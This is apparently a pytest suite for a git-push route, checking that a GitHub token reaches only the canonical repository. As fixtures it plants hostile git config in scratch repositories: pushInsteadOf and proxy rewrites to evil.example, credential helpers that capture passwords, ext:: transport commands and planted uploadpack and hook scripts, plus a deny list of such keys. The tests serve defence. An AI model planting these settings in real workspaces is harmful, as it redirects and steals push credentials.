"""git/push cannot hand its credential to anything but github.com/<owner>/<repo>.

Reproduced attack (audit on #138): a tenant with exec on a workspace sets
``git config url.https://evil.example/.pushInsteadOf https://github.com/`` and
triggers the push route. Re-adding ``origin`` never cleared that rewrite, and the
old credential helper printed the token for ANY host, so the credential went to
evil.example.

These tests run the route's REAL generated shell commands with the REAL ``git``
binary against a scratch repository (``_WORKDIR`` is pointed at it). Only
``git push`` itself is intercepted — by a shim that records what the route
handed git and then asks real git, with those exact ``-c`` overrides, which
credential it would send to github.com and to evil.example.
"""

from __future__ import annotations

import json
import os
import shlex
import shutil
import subprocess
import sys
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

import src.routers.containers.git_push as gp

_TOKEN = "ghs_tenant_push_token_must_only_reach_github"  # noqa: S105  # pragma: allowlist secret
_OWNER, _REPO = "acme-corp", "repo"
_GIT = shutil.which("git")

pytestmark = pytest.mark.skipif(_GIT is None, reason="needs a real git binary")

# Apple's git reads an extra, unconditional system-level file
# (.../CommandLineTools/usr/share/git-core/gitconfig, credential.helper=osxkeychain)
# that GIT_CONFIG_SYSTEM cannot redirect — only GIT_CONFIG_NOSYSTEM silences it.
# On such a host the scratch "system" file is unusable, so system scope is
# switched off and the system-scope test skips (it runs on Linux CI).
_APPLE_GIT = (
    bool(_GIT)
    and "Apple"
    in subprocess.run([_GIT, "--version"], capture_output=True, text=True, check=False).stdout
)


def _helper_run(action: str, stdin: str, token: str | None = _TOKEN) -> str:
    """Run the ``!``-helper exactly as git does: ``sh -c '<script> "$@"' <script> <action>``."""
    script = gp._credential_helper_script(_OWNER, _REPO)[1:]
    env = {"PATH": os.environ["PATH"]}
    if token is not None:
        env[gp._TOKEN_ENV] = token
    out = subprocess.run(
        ["sh", "-c", f'{script} "$@"', script, action],
        input=stdin,
        capture_output=True,
        text=True,
        env=env,
        check=True,
        timeout=10,
    )
    return out.stdout


# ---------------------------------------------------------------------------
# 1. The helper is host- and path-bound
# ---------------------------------------------------------------------------


class TestHelperIsHostAndPathBound:
    @pytest.mark.parametrize("path", [f"{_OWNER}/{_REPO}", f"{_OWNER}/{_REPO}.git"])
    def test_github_and_the_canonical_path_get_the_token(self, path):
        out = _helper_run("get", f"protocol=https\nhost=github.com\npath={path}\n")
        assert out == f"username=x-access-token\npassword={_TOKEN}\n"

    @pytest.mark.parametrize(
        "stdin",
        [
            f"protocol=https\nhost=evil.example\npath={_OWNER}/{_REPO}\n",
            "protocol=https\nhost=github.com\npath=acme-corp/other\n",
            "protocol=https\nhost=github.com\npath=attacker/repo\n",
            f"protocol=https\nhost=github.com.evil.example\npath={_OWNER}/{_REPO}\n",
            f"protocol=http\nhost=github.com\npath={_OWNER}/{_REPO}\n",
            # No path at all: what git sends without credential.useHttpPath.
            "protocol=https\nhost=github.com\n",
        ],
    )
    def test_anything_else_gets_nothing(self, stdin):
        assert _helper_run("get", stdin) == ""

    @pytest.mark.parametrize("action", ["store", "erase"])
    def test_store_and_erase_are_ignored(self, action):
        stdin = f"protocol=https\nhost=github.com\npath={_OWNER}/{_REPO}\npassword=x\n"
        assert _helper_run(action, stdin) == ""

    def test_no_token_in_env_prints_no_empty_password(self):
        out = _helper_run("get", f"protocol=https\nhost=github.com\npath={_OWNER}/{_REPO}\n", None)
        assert out == ""

    def test_the_token_is_never_in_the_script_text(self):
        assert _TOKEN not in " ".join(gp._push_git_config_args(_OWNER, _REPO))


# ---------------------------------------------------------------------------
# 2. Real git: with the route's -c overrides, a pre-set helper is cleared
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def _isolate_from_the_enclosing_git(monkeypatch):
    """Strip every inherited ``GIT_*`` variable before any real git runs.

    Under a pre-commit hook git exports ``GIT_DIR``/``GIT_INDEX_FILE`` for the
    repository being committed, and ``git -C <tmp>`` honours them over ``-C``.
    Measured 2026-09-22: without this, the scratch-repo commit landed on the
    developer's branch and the "stolen" credential helpers were written into
    the real ``.git/config`` shared by every worktree.
    """
    for key in [k for k in os.environ if k.startswith("GIT_")]:
        monkeypatch.delenv(key, raising=False)


def _init_repo(root: Path) -> Path:
    repo = root / "ws"
    subprocess.run([_GIT, "init", "-q", "-b", "main", str(repo)], check=True)
    (repo / "f.txt").write_text("x\n")
    subprocess.run([_GIT, "-C", str(repo), "add", "f.txt"], check=True)
    subprocess.run(
        [_GIT, "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "c"],
        check=True,
    )
    return repo


def _base_env(root: Path) -> dict[str, str]:
    home = root / "home"
    home.mkdir(exist_ok=True)
    system = root / "system.gitconfig"
    system.touch()
    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
    # A clean "system" file stands in for the image's /etc/gitconfig, so the
    # host's own (e.g. osxkeychain) never leaks into the assertion.
    env.update(HOME=str(home), GIT_CONFIG_SYSTEM=str(system), GIT_TERMINAL_PROMPT="0")
    # ⚠️ XDG_CONFIG_HOME is SET on GitHub-hosted runners. Inherited, git reads
    # <host>/.config/git/config and ignores the $HOME/.config the `xdg` variants
    # write, so their trace2 config is never loaded and no trace file appears
    # (measured: the three [*-xdg] cases are the only ones red on a hosted runner).
    # Pin it into the scratch home so both `where` variants are hermetic.
    env["XDG_CONFIG_HOME"] = str(home / ".config")
    if _APPLE_GIT:
        env["GIT_CONFIG_NOSYSTEM"] = "1"
    return env


def _fill(repo: Path, env: dict[str, str], host: str, path: str) -> subprocess.CompletedProcess:
    args = " ".join(shlex.quote(a) for a in gp._push_git_config_args(_OWNER, _REPO))
    return subprocess.run(
        [
            "sh",
            "-c",
            f"cd {shlex.quote(str(repo))} && GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null "
            f"GIT_ASKPASS= git {args} credential fill",
        ],
        input=f"protocol=https\nhost={host}\npath={path}\n",
        capture_output=True,
        text=True,
        env={**env, gp._TOKEN_ENV: _TOKEN},
        timeout=20,
    )


class TestRealGitCredentialFill:
    @pytest.fixture
    def repo_env(self, tmp_path, monkeypatch):
        repo = _init_repo(tmp_path)
        monkeypatch.setattr(gp, "_WORKDIR", str(repo))
        # A workspace that already configured helpers of its own, generic and
        # url-scoped: each one answers with a fake password AND records every
        # request it is sent (git sends `store` WITH the real password after a
        # successful push). Without `-c credential.helper=` they are all run.
        self.stolen = tmp_path / "stolen.txt"
        thief = (
            f'!f() {{ echo "$1" >> {self.stolen}; cat >> {self.stolen}; echo password=EVIL; }}; f'
        )
        for key in ("credential.helper", "credential.https://github.com.helper"):
            subprocess.run([_GIT, "-C", str(repo), "config", "--add", key, thief], check=True)
        return repo, _base_env(tmp_path)

    def _stolen(self) -> str:
        return self.stolen.read_text() if self.stolen.exists() else ""

    def test_workspace_helpers_never_run_not_even_for_store(self, repo_env):
        """``credential approve`` is what git runs after a successful push."""
        repo, env = repo_env
        args = " ".join(shlex.quote(a) for a in gp._push_git_config_args(_OWNER, _REPO))
        out = subprocess.run(
            [
                "sh",
                "-c",
                f"cd {shlex.quote(str(repo))} && GIT_CONFIG_NOSYSTEM=1 "
                f"GIT_CONFIG_GLOBAL=/dev/null git {args} credential approve",
            ],
            input=(
                f"protocol=https\nhost=github.com\npath={_OWNER}/{_REPO}\n"
                f"username=x-access-token\npassword={_TOKEN}\n"
            ),
            capture_output=True,
            text=True,
            env=env,
            timeout=20,
        )
        assert out.returncode == 0, out.stderr
        assert self._stolen() == ""

    def test_canonical_target_gets_our_token_not_the_workspace_helper(self, repo_env):
        repo, env = repo_env
        out = _fill(repo, env, "github.com", f"{_OWNER}/{_REPO}")
        assert out.returncode == 0, out.stderr
        assert f"password={_TOKEN}" in out.stdout
        assert "EVIL" not in out.stdout
        assert self._stolen() == ""

    @pytest.mark.parametrize(
        ("host", "path"), [("evil.example", f"{_OWNER}/{_REPO}"), ("github.com", "acme-corp/x")]
    )
    def test_foreign_host_or_path_gets_no_token(self, repo_env, host, path):
        repo, env = repo_env
        out = _fill(repo, env, host, path)
        assert _TOKEN not in out.stdout + out.stderr
        assert "EVIL" not in out.stdout
        assert self._stolen() == ""
        assert out.returncode != 0  # nothing answered; prompts are disabled


# ---------------------------------------------------------------------------
# 3. The route, end to end against a real repository
# ---------------------------------------------------------------------------

_SHIM = """#!{python}
import json, os, subprocess, sys
real = os.environ["REAL_GIT"]
args = sys.argv[1:]
if "push" not in args:
    os.execv(real, [real, *args])
i = args.index("push")
cfg, rest = args[:i], args[i + 1:]

def fill(host, path):
    r = subprocess.run([real, *cfg, "credential", "fill"],
                       input=f"protocol=https\\nhost={{host}}\\npath={{path}}\\n",
                       capture_output=True, text=True)
    return r.stdout

with open(os.environ["SHIM_LOG"], "a") as fh:
    fh.write(json.dumps({{
        "cfg": cfg, "rest": rest,
        "nosystem": os.environ.get("GIT_CONFIG_NOSYSTEM"),
        "global": os.environ.get("GIT_CONFIG_GLOBAL"),
        "has_token": bool(os.environ.get("{tok}")),
        "github": fill("github.com", "{owner}/{repo}"),
        "evil": fill("evil.example", "{owner}/{repo}"),
    }}) + "\\n")

# SHIM_PUSH_TO: really push, with the route's exact -c overrides and environment,
# to a local bare repo standing in for github.com (so pack-objects really runs).
target = os.environ.get("SHIM_PUSH_TO")
if target:
    rest = [target if a.startswith("https://github.com/") else a for a in rest]
    # The stand-in is a local path (transport "file"): allow "file" exactly where the
    # route allowed "https", and nowhere else (the planted transports stay refused).
    env = dict(os.environ)
    allowed = env.get("GIT_ALLOW_PROTOCOL")
    if allowed is not None and "https" in allowed.split(":"):
        env["GIT_ALLOW_PROTOCOL"] = allowed + ":file"
    if "protocol.https.allow=always" in cfg:
        cfg = [*cfg, "-c", "protocol.file.allow=always"]
    sys.exit(subprocess.run([real, *cfg, "push", *rest], env=env).returncode)
"""


class _RealWorkspace:
    """``execute_command`` that runs the route's command for real, in ``repo``."""

    def __init__(self, repo: Path, env: dict[str, str], shim_dir: Path, log: Path):
        self.repo, self.env, self.log = repo, env, log
        self.env_path = f"{shim_dir}{os.pathsep}{env['PATH']}"
        self.calls: list[tuple[str, dict | None]] = []
        self.after_remote_add: list[list[str]] = []
        self.after_guard: list[list[str]] = []
        self.push_to: str | None = None

    async def execute_command(self, container_name, command, tenant_id=None, timeout=300, env=None):
        self.calls.append((command, env))
        run_env = {
            **self.env,
            **(env or {}),
            "PATH": self.env_path,
            "REAL_GIT": _GIT,
            "SHIM_LOG": str(self.log),
            **({"SHIM_PUSH_TO": self.push_to} if self.push_to else {}),
        }
        r = subprocess.run(
            ["sh", "-c", command], capture_output=True, text=True, env=run_env, timeout=60
        )
        if " remote add origin " in command:
            for extra in self.after_remote_add:
                subprocess.run([_GIT, "-C", str(self.repo), *extra], check=True, env=self.env)
        if command == gp._config_guard_command():
            for extra in self.after_guard:
                subprocess.run([_GIT, "-C", str(self.repo), *extra], check=True, env=self.env)
        return {"exit_code": r.returncode, "stdout": r.stdout, "stderr": r.stderr}

    def pushes(self) -> list[dict]:
        if not self.log.exists():
            return []
        return [json.loads(line) for line in self.log.read_text().splitlines() if line]


@pytest.fixture
def workspace(tmp_path, monkeypatch):
    repo = _init_repo(tmp_path)
    monkeypatch.setattr(gp, "_WORKDIR", str(repo))
    shim_dir = tmp_path / "shim"
    shim_dir.mkdir()
    shim = shim_dir / "git"
    shim.write_text(
        _SHIM.format(python=sys.executable, tok=gp._TOKEN_ENV, owner=_OWNER, repo=_REPO)
    )
    shim.chmod(0o755)
    return _RealWorkspace(repo, _base_env(tmp_path), shim_dir, tmp_path / "push.log")


@pytest.fixture(autouse=True)
def _default_branch_is_not_the_pushed_one(monkeypatch):
    """This file tests where the credential can go, pushing ``main`` to a scratch
    bare repo. The default-branch refusal is owned by
    test_git_push_default_branch.py; report a default no test here pushes to so
    the route's GitHub lookup never leaves the process."""

    async def _fake(owner, repo, token):
        return gp._RepoInfo(default_branch="trunk", private=True)

    async def _base(owner, repo, branch, default_branch, token):
        # The remote "has" the workspace's current HEAD: the pushed-path range is
        # empty, so these tests exercise the credential path, not the path guard.
        return subprocess.run(
            [_GIT, "-C", gp._WORKDIR, "rev-parse", "HEAD"],
            capture_output=True,
            text=True,
            check=True,
        ).stdout.strip()

    monkeypatch.setattr(gp, "_remote_repo_info", _fake)
    monkeypatch.setattr(gp, "_push_base_sha", _base)


async def _post(app, client, ws: _RealWorkspace):
    from coding_client.auth.tenant import get_current_user_with_tenant
    from src.models.container_models import ContainerStatus

    user = MagicMock()
    user.is_admin.return_value = True
    user.effective_tenant_id = "tenant-7"
    app.dependency_overrides[get_current_user_with_tenant] = lambda: user
    container = MagicMock()
    container.container_name = "ctr"
    container.status = ContainerStatus("running")
    container.tenant_id = "tenant-7"
    container.repo_url = f"https://github.com/{_OWNER}/{_REPO}"
    container.github_access_token = _TOKEN  # BYO: no coding-github call needed
    manager = MagicMock()
    manager.get_container.return_value = container
    manager.execute_command = AsyncMock(side_effect=ws.execute_command)
    try:
        with patch("src.routers.containers.get_container_manager", return_value=manager):
            return await client.post("/api/containers/ctr/git/push", json={"branch": "main"})
    finally:
        app.dependency_overrides.clear()


def _git(ws: _RealWorkspace, *args: str, env: dict[str, str] | None = None) -> None:
    subprocess.run([_GIT, "-C", str(ws.repo), *args], check=True, env=env or ws.env)


@pytest.mark.asyncio
class TestRouteRefusesRedirectingConfig:
    @pytest.mark.parametrize(
        "setup",
        [
            ["config", "url.https://evil.example/.pushInsteadOf", "https://github.com/"],
            ["config", "url.https://evil.example/.insteadOf", "https://github.com/"],
            ["config", "credential.helper", "!f() { cat > /tmp/stolen; }; f"],
            ["config", "credential.https://github.com.helper", "store"],
            [
                "config",
                "remote.https://github.com/acme-corp/repo.pushurl",
                "https://evil.example/x",
            ],
            ["config", "http.proxy", "http://evil.example:3128"],
            ["config", "http.https://github.com/.sslVerify", "false"],
        ],
        ids=[
            "pushInsteadOf",
            "insteadOf",
            "credential.helper",
            "url-scoped-helper",
            "remote-named-by-url",
            "http.proxy",
            "sslVerify",
        ],
    )
    async def test_local_config_refuses_the_push(self, app, client, workspace, setup):
        _git(workspace, *setup)
        response = await _post(app, client, workspace)
        assert response.status_code == 409, response.text
        assert response.json()["error"]["message"].startswith("push_config_refused")
        assert workspace.pushes() == []
        assert all(env is None for _cmd, env in workspace.calls), "token left the process"

    async def test_global_config_rewrite_refuses_the_push(self, app, client, workspace):
        home = Path(workspace.env["HOME"])
        (home / ".gitconfig").write_text(
            '[url "https://evil.example/"]\n\tpushInsteadOf = https://github.com/\n'
        )
        response = await _post(app, client, workspace)
        assert response.status_code == 409, response.text
        assert workspace.pushes() == []

    @pytest.mark.skipif(_APPLE_GIT, reason="Apple git: system scope cannot be redirected")
    async def test_system_config_rewrite_refuses_the_push(self, app, client, workspace):
        Path(workspace.env["GIT_CONFIG_SYSTEM"]).write_text(
            '[url "https://evil.example/"]\n\tinsteadOf = https://github.com/\n'
        )
        response = await _post(app, client, workspace)
        assert response.status_code == 409, response.text
        assert workspace.pushes() == []

    async def test_included_file_rewrite_refuses_the_push(self, app, client, workspace, tmp_path):
        inc = tmp_path / "inc.gitconfig"
        inc.write_text('[url "https://evil.example/"]\n\tpushInsteadOf = https://github.com/\n')
        _git(workspace, "config", "include.path", str(inc))
        response = await _post(app, client, workspace)
        assert response.status_code == 409, response.text
        assert workspace.pushes() == []

    async def test_config_added_after_the_guard_exec_is_caught_in_the_push_exec(
        self, app, client, workspace, tmp_path
    ):
        """TOCTOU: config lands between the guard exec and the push exec.

        A benign-looking include is used on purpose: the URL-resolution tripwire
        cannot see it, so only the guard the push exec re-runs refuses it.
        """
        inc = tmp_path / "benign.gitconfig"
        inc.write_text("[core]\n\tautocrlf = false\n")
        workspace.after_guard.append(["config", "include.path", str(inc)])
        response = await _post(app, client, workspace)
        assert response.status_code == 409, response.text
        assert response.json()["error"]["message"].startswith("push_config_refused")
        assert "include.path" in response.json()["error"]["message"]
        assert workspace.pushes() == []
        # It was the push exec (the only one carrying the token) that refused.
        assert workspace.calls[-1][1] == {gp._TOKEN_ENV: _TOKEN}

    async def test_rewrite_the_guard_cannot_see_is_caught_by_the_resolution_check(
        self, app, client, workspace, monkeypatch
    ):
        """The in-exec URL resolution tripwire still stands behind a blind guard."""
        monkeypatch.setattr(gp, "_DANGEROUS_CONFIG_RE", "^never-matches$")
        _git(workspace, "config", "url.https://evil.example/.pushInsteadOf", "https://github.com/")
        response = await _post(app, client, workspace)
        assert response.status_code == 409, response.text
        assert response.json()["error"]["message"].startswith("push_url_rewritten")
        assert workspace.pushes() == []


def _hasconfig_include(ws: _RealWorkspace, tmp_path: Path) -> None:
    """The auditor's case: an include that switches on only once origin is github.com."""
    inc = tmp_path / "evil.gitconfig"
    inc.write_text("[http]\n\tproxy = http://evil.example:3128\n")
    _git(ws, "config", "includeIf.hasconfig:remote.*.url:https://github.com/**.path", str(inc))
    # Precondition that makes it a bypass: the scratch workspace has no github
    # origin yet, so the include is INACTIVE and a guard run now sees nothing.
    before = subprocess.run(
        [_GIT, "-C", str(ws.repo), "config", "--get", "http.proxy"],
        capture_output=True,
        text=True,
        env=ws.env,
        check=False,
    )
    assert before.returncode == 1, before.stdout


@pytest.mark.asyncio
class TestConditionalIncludeCannotBypassTheGuard:
    async def test_hasconfig_include_keyed_on_the_github_origin_is_refused(
        self, app, client, workspace, tmp_path
    ):
        _hasconfig_include(workspace, tmp_path)
        response = await _post(app, client, workspace)
        assert response.status_code == 409, response.text
        assert response.json()["error"]["message"].startswith("push_config_refused")
        assert workspace.pushes() == []
        assert all(env is None for _cmd, env in workspace.calls), "token left the process"

    async def test_ordering_alone_sees_the_activated_include(
        self, app, client, workspace, tmp_path, monkeypatch
    ):
        """With the include-key rule removed, the guard must still run late enough
        to see what the include switched on (``http.proxy``) — i.e. after the
        origin re-point. A guard run before the re-point lets this push through."""
        monkeypatch.setattr(gp, "_DANGEROUS_CONFIG_RE", gp._REDIRECT_CONFIG_RE)
        _hasconfig_include(workspace, tmp_path)
        response = await _post(app, client, workspace)
        assert response.status_code == 409, response.text
        assert "http.proxy" in response.json()["error"]["message"]
        assert workspace.pushes() == []
        # Refused by the tokenless guard exec, not only by the push exec's re-run.
        assert all(env is None for _cmd, env in workspace.calls), "token left the process"

    async def test_any_include_directive_is_refused_even_a_benign_one(
        self, app, client, workspace, tmp_path
    ):
        inc = tmp_path / "benign.gitconfig"
        inc.write_text("[core]\n\tautocrlf = false\n")
        _git(workspace, "config", "include.path", str(inc))
        response = await _post(app, client, workspace)
        assert response.status_code == 409, response.text
        assert "include.path" in response.json()["error"]["message"]
        assert workspace.pushes() == []

    async def test_guard_runs_after_the_origin_re_point(self, app, client, workspace):
        await _post(app, client, workspace)
        cmds = [cmd for cmd, _env in workspace.calls]
        add = next(i for i, c in enumerate(cmds) if " remote add origin " in c)
        guard = cmds.index(gp._config_guard_command())
        assert add < guard


@pytest.mark.asyncio
class TestRoutePushesOnlyToTheCanonicalUrl:
    async def test_clean_workspace_pushes_and_only_github_gets_the_token(
        self, app, client, workspace
    ):
        response = await _post(app, client, workspace)
        assert response.status_code == 200, response.text
        (push,) = workspace.pushes()
        tip = subprocess.run(
            [_GIT, "-C", str(workspace.repo), "rev-parse", "refs/heads/main"],
            capture_output=True,
            text=True,
            check=True,
        ).stdout.strip()
        assert push["rest"] == [
            "--no-recurse-submodules",
            f"https://github.com/{_OWNER}/{_REPO}",
            f"{tip}:refs/heads/main",
        ]
        assert push["nosystem"] == "1"
        assert push["global"] == "/dev/null"
        assert push["has_token"] is True
        # A workspace pre-push hook / askpass would inherit $GIT_PUSH_TOKEN.
        assert "core.hooksPath=/dev/null" in push["cfg"]
        assert "core.askPass=" in push["cfg"]
        assert f"password={_TOKEN}" in push["github"]
        assert _TOKEN not in push["evil"]
        # The token travelled only in the push exec's env — never in a command.
        with_env = [env for _c, env in workspace.calls if env]
        assert with_env == [{gp._TOKEN_ENV: _TOKEN}]
        assert all(_TOKEN not in cmd for cmd, _env in workspace.calls)
        # Nothing credential-shaped was left in the workspace config.
        cfg = subprocess.run(
            [_GIT, "-C", str(workspace.repo), "config", "--list", "--local"],
            capture_output=True,
            text=True,
            check=True,
        ).stdout
        assert "credential" not in cfg and _TOKEN not in cfg
        # origin/main records what was pushed, so the next probe sees 0 unpushed.
        head = subprocess.run(
            [_GIT, "-C", str(workspace.repo), "rev-parse", "HEAD", "origin/main"],
            capture_output=True,
            text=True,
            check=True,
        ).stdout.split()
        assert head[0] == head[1]


def test_kubernetes_env_prefix_accepts_the_token_and_the_exec_log_omits_it():
    """On Kubernetes the env rides as ``/usr/bin/env K=V`` (``with_env``). The
    key must be one ``with_env`` accepts, and the exec log line must not carry it."""
    from src.core.log_safety import summarize_command
    from src.runtime.kubernetes import with_env

    argv = with_env(
        ["sh", "-c", gp._push_command(_OWNER, _REPO, "main", "a" * 40, force=False)],
        {gp._TOKEN_ENV: _TOKEN},
    )
    assert f"{gp._TOKEN_ENV}={_TOKEN}" in argv
    assert _TOKEN not in summarize_command(argv)


# ---------------------------------------------------------------------------
# 4. No git the route runs executes a command named by workspace config
# ---------------------------------------------------------------------------


def _plant_partial_clone(ws: _RealWorkspace, tmp_path: Path, kind: str) -> Path:
    """Make the workspace a partial clone missing one pushed blob, whose promisor
    remote runs a marker command when git lazily fetches. ``kind``: ``ext`` (an
    ``ext::`` URL under ``protocol.allow=always``) or ``uploadpack`` (a local-path
    remote with a planted ``remote.evil.uploadpack``). Returns the marker.

    Arming control: plain ``git push`` of the branch to a fresh bare repo, in the
    workspace's own environment, runs the planted command.
    """
    marker = tmp_path / f"lazy-{kind}.ran"
    first = subprocess.run(
        [_GIT, "-C", str(ws.repo), "rev-parse", "HEAD:f.txt"],
        capture_output=True,
        text=True,
        check=True,
        env=ws.env,
    ).stdout.strip()
    (ws.repo / "f.txt").write_text("second\n")
    _git(ws, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "two")
    (ws.repo / ".git" / "objects" / first[:2] / first[2:]).unlink()
    _git(ws, "config", "extensions.partialClone", "evil")
    _git(ws, "config", "remote.evil.promisor", "true")
    if kind == "ext":
        _git(ws, "config", "protocol.allow", "always")
        _git(ws, "config", "remote.evil.url", f"ext::sh -c touch% {marker}")
    else:
        upstream = tmp_path / "promisor.git"
        subprocess.run([_GIT, "init", "-q", "--bare", str(upstream)], check=True, env=ws.env)
        script = tmp_path / "uploadpack.sh"
        script.write_text(f'#!/bin/sh\ntouch "{marker}"\nexit 1\n')
        script.chmod(0o755)
        _git(ws, "config", "remote.evil.url", str(upstream))
        _git(ws, "config", "remote.evil.uploadpack", str(script))
    arming = tmp_path / "arming.git"
    subprocess.run([_GIT, "init", "-q", "--bare", str(arming)], check=True, env=ws.env)
    subprocess.run(
        [_GIT, "-C", str(ws.repo), "push", str(arming), "refs/heads/main:refs/heads/main"],
        capture_output=True,
        env=ws.env,
        stdin=subprocess.DEVNULL,
        timeout=60,
    )
    assert marker.exists(), f"fixture not armed: git push did not lazy-fetch ({kind})"
    marker.unlink()
    ws.push_to = str(tmp_path / "github-stand-in.git")
    subprocess.run([_GIT, "init", "-q", "--bare", ws.push_to], check=True, env=ws.env)
    return marker


@pytest.mark.asyncio
@pytest.mark.parametrize("kind", ["ext", "uploadpack"])
class TestPushNeverLazyFetchesThroughAPlantedPromisor:
    async def test_the_guard_refuses_the_partial_clone_config(
        self, app, client, workspace, tmp_path, kind
    ):
        marker = _plant_partial_clone(workspace, tmp_path, kind)
        response = await _post(app, client, workspace)
        assert not marker.exists(), "the planted promisor command ran"
        assert response.status_code == 409, response.text
        assert response.json()["error"]["message"].startswith("push_config_refused")
        assert "extensions.partialclone" in response.json()["error"]["message"]
        assert workspace.pushes() == []

    async def test_with_the_guard_blind_the_push_still_never_lazy_fetches(
        self, app, client, workspace, tmp_path, kind, monkeypatch
    ):
        """Second layer: GIT_NO_LAZY_FETCH in the push exec (the one holding the token)."""
        marker = _plant_partial_clone(workspace, tmp_path, kind)
        monkeypatch.setattr(gp, "_config_guard_command", lambda: "exit 1")
        response = await _post(app, client, workspace)
        (push,) = workspace.pushes()  # the real push ran, with the token in its env
        assert push["has_token"] is True
        assert not marker.exists(), "the push lazily fetched through the planted remote"
        assert response.status_code == 500, response.text  # missing blob: fails closed


@pytest.mark.asyncio
class TestGuardRefusesFetchAndTransportConfig:
    @pytest.mark.parametrize(
        ("setup", "key"),
        [
            (["extensions.partialClone", "origin"], "extensions.partialclone"),
            (["remote.x.promisor", "true"], "remote.x.promisor"),
            (["remote.x.partialCloneFilter", "blob:none"], "remote.x.partialclonefilter"),
            (["remote.x.uploadpack", "/tmp/evil"], "remote.x.uploadpack"),
            (["remote.x.receivepack", "/tmp/evil"], "remote.x.receivepack"),
            (["protocol.allow", "always"], "protocol.allow"),
            (["protocol.ext.allow", "always"], "protocol.ext.allow"),
            (["uploadpack.packObjectsHook", "/tmp/evil"], "uploadpack.packobjectshook"),
            (["remote.x.url", "ext::sh -c evil"], "remote.x.url"),
            (["remote.x.pushurl", "fd::3"], "remote.x.pushurl"),
            (["remote.x.url", "evilhelper::https://example.com/r"], "remote.x.url"),
            (["push.recurseSubmodules", "on-demand"], "push.recursesubmodules"),
            (["fetch.recurseSubmodules", "yes"], "fetch.recursesubmodules"),
            (["submodule.recurse", "true"], "submodule.recurse"),
            (["submodule.sub.update", "!sh -c evil"], "submodule.sub.update"),
            (["submodule.sub.url", "ext::sh -c evil"], "submodule.sub.url"),
            (["protocol.file.allow", "always"], "protocol.file.allow"),
        ],
        ids=[
            "partialClone",
            "promisor",
            "partialCloneFilter",
            "uploadpack",
            "receivepack",
            "protocol.allow",
            "protocol.ext.allow",
            "packObjectsHook",
            "ext-url",
            "fd-pushurl",
            "helper-url",
            "push.recurseSubmodules",
            "fetch.recurseSubmodules",
            "submodule.recurse",
            "submodule-update-cmd",
            "submodule-ext-url",
            "protocol.file.allow",
        ],
    )
    async def test_refused(self, app, client, workspace, setup, key):
        _git(workspace, "config", *setup)
        response = await _post(app, client, workspace)
        assert response.status_code == 409, response.text
        assert key in response.json()["error"]["message"]
        assert workspace.pushes() == []
        assert all(env is None for _cmd, env in workspace.calls), "token left the process"

    async def test_an_ordinary_remote_url_is_not_refused(self, app, client, workspace):
        _git(workspace, "config", "remote.upstream.url", "https://github.com/acme-corp/up")
        _git(workspace, "config", "remote.mirror.url", "git@github.com:acme-corp/m.git")
        response = await _post(app, client, workspace)
        assert response.status_code == 200, response.text


@pytest.mark.asyncio
async def test_post_push_ref_updates_never_run_a_workspace_hook(app, client, workspace, tmp_path):
    """``update-ref`` (recording origin/<branch>) runs a workspace
    ``reference-transaction`` hook unless hooks are off, as they are for the push."""
    marker = tmp_path / "reference-transaction.ran"
    hook = workspace.repo / ".git" / "hooks" / "reference-transaction"
    hook.write_text(f'#!/bin/sh\ntouch "{marker}"\ncat >/dev/null\nexit 0\n')
    hook.chmod(0o755)
    # Arming control: plain update-ref runs it.
    _git(workspace, "update-ref", "refs/arming", "HEAD")
    assert marker.exists(), "fixture not armed: update-ref skipped reference-transaction"
    marker.unlink()
    _git(workspace, "-c", "core.hooksPath=/dev/null", "update-ref", "-d", "refs/arming")

    response = await _post(app, client, workspace)

    assert response.status_code == 200, response.text
    head = subprocess.run(
        [_GIT, "-C", str(workspace.repo), "rev-parse", "HEAD", "origin/main"],
        capture_output=True,
        text=True,
        check=True,
    ).stdout.split()
    assert head[0] == head[1]  # update-ref really ran
    assert not marker.exists(), "a workspace reference-transaction hook ran"


def test_every_git_the_route_runs_exports_no_lazy_fetch():
    """String-level pin for the commands no behavioural test can arm (rev-list,
    remote add, branch --set-upstream-to)."""
    assert "GIT_NO_LAZY_FETCH=1" in gp._in_workdir("git rev-list --count HEAD")
    assert "core.hooksPath=/dev/null" in gp._hardened_git()
    assert "core.fsmonitor=false" in gp._hardened_git()
    assert "GIT_NO_LAZY_FETCH=1" in gp._push_command(_OWNER, _REPO, "main", "a" * 40, force=False)


# ---------------------------------------------------------------------------
# 5. The push never recurses into a submodule, and never runs a planted transport
# ---------------------------------------------------------------------------
#
# Reproduced (audit on #157): ``push.recurseSubmodules=on-demand`` in the workspace
# config + a pushed commit carrying a gitlink + that submodule's OWN config
# ``remote.origin.url=ext::<cmd>`` / ``protocol.ext.allow=always`` -> "Pushing
# submodule 'sub'", and ``<cmd>`` ran with ``$GIT_PUSH_TOKEN`` in its environment.
# Two independent layers, each run alone (the guard is blinded in the matrix; its
# refusal of ``push.recurseSubmodules`` is covered in TestGuardRefusesFetchAndTransportConfig):
#
# =================  ==========================================================
# recursion          ``--no-recurse-submodules`` + ``push.recurseSubmodules=no`` /
#                    ``submodule.recurse=false`` / ``fetch.recurseSubmodules=false``
# protocol           ``GIT_ALLOW_PROTOCOL`` (``https`` on the push, empty elsewhere)
#                    + ``protocol.allow/ext/file`` pins
# =================  ==========================================================

SUBMODULE_LAYERS = ["both", "recursion_only", "protocol_only", "neither"]


def _submodule_layers(monkeypatch, layer: str) -> None:
    from src.routers.containers import _common

    if layer in ("protocol_only", "neither"):  # drop the recursion layer
        monkeypatch.setattr(gp, "_PUSH_NO_RECURSE_FLAG", "")
        monkeypatch.setattr(
            _common,
            "WORKSPACE_GIT_TRANSPORT_CONFIG",
            tuple(c for c in _common.WORKSPACE_GIT_TRANSPORT_CONFIG if "recurse" not in c.lower()),
        )
    if layer in ("recursion_only", "neither"):  # drop the protocol layer
        monkeypatch.setattr(gp, "_PUSH_ALLOWED_PROTOCOLS", "")
        monkeypatch.setattr(
            _common,
            "WORKSPACE_GIT_ENV",
            tuple(e for e in _common.WORKSPACE_GIT_ENV if not e.startswith("GIT_ALLOW_PROTOCOL=")),
        )
        monkeypatch.setattr(
            _common,
            "WORKSPACE_GIT_TRANSPORT_CONFIG",
            tuple(
